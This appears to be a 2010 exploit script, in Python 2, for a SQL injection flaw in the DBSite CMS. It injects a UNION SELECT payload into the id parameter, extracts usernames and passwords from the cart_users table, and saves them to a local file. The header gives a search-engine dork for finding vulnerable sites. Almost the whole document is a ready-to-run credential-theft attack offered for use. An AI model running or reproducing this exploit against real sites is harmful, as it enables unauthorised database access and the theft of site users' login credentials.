#!/usr/bin/env python
# -*- coding: utf-8 -*-
# --------------------------------------------------------
# Exploit Title: DBSite Remote SQL Injection Vulnerability
# Date: 13/10/2010
# Author: God_Of_Pain
# Version: 1.0
# Tested on: Linux
# --------------------------------------------------------
# ========================================================
# Greetz to: LordTittiS3000 && System_Overide
# Example: http://www.site.it/index.php?id=[SQLi]
# Dork: intext:"Powered by DBSite" inurl:index.php?id=
# ========================================================

import urllib2
import sys
import re
import os
import time
import platform

if platform.system() == "Linux":
	os.system('clear')
elif platform.system() == "Windows":
	os.system('cls')

try:
	testo = """
	*****************************************************************
	*          +----------------------------------------+           *
	*          | CMS DBSite SQL Injection Vulnerability |           *
	*          +----------------------------------------+           *
	*          |     Bug Discovered  By God_Of_Pain     |           *
	*          +----------------------------------------+           *
	*          |      Exploit Coded By God_Of_Pain      |           *
	*          +----------------------------------------+           *
	* ============================================================  *
	* +----------------------------------------------------------+  *
	* |               Usage: Exploit.py <site> <id>              |  *
	* +----------------------------------------------------------+  *
	* |  python exploit.py <http://site.com/index.php?ID=> <10>  |  *
	* +----------------------------------------------------------+  *
	*****************************************************************

	"""
	print(testo)
	time.sleep(1)

	target = sys.argv[1]
	ID = sys.argv[2]
	http = "http://"
	sql = "+union+select+concat(0x3e3e3e,USERNAME,0x3a3a3a,PWD,0x3e3e3e),2,3+from+cart_users--"
	newid = "-"
	spa = " "

	if http in target:
		del(http)
	sqli = target + newid + ID + sql
	if spa in sqli:
		del(spa)
	print "Ok, Exploiting..."
	print ""
	time.sleep(1)
	print "Please Wait..."
	print ""
	time.sleep(1)
	try:
		prov = urllib2.urlopen(sqli).read()
		prov2 = re.findall(r">>>(.*)([0-9a-zA-Z])([^<>])(.*)>>>", prov)
		if len(prov2) > 1:
			print "+--------------+"
			print "| Exploit Done |"
			print "+--------------+"
			print "User & Pwd =>   " + prov2[0][0] + prov2[0][1]
			time.sleep(1)
			print ""
			print "Saving User && PWD in a .txt file..."
			print ""
			o = open("User&&PwdDBSiteExploit.txt", "w")
			o.write(prov2[0][0] + prov2[0][1])
			o.close()
			print "Saved!"
			print ""
			print "Thanks for using this Exploit!"
		else:
			print "+----------------------+"
			print "|    Exploit Failed    |"
			print "+----------------------+"
			print "|    I'm so sorry :(   |"
			print "+----------------------+"
	except urllib2.HTTPError:
		print "Sorry! Exploit Failed! There is an error :("
except IndexError:
	print "-* Good Luck! *-"

# The End! :)
# -------------------------------------
# http://oversecuritycrew.webnet32.com/
# -------------------------------------
